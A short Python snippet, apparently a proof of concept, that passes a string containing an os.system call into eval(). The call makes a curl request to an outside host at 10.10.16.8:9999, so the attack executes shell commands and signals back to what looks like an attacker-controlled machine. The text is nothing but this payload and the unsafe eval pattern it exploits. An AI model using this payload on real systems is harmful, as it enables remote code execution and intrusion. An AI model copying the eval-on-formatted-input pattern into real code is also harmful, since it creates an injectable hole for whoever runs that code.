value = "__import__('os').system('curl http://10.10.16.8:9999')"
if eval('%s > 1' % value):
    print("no")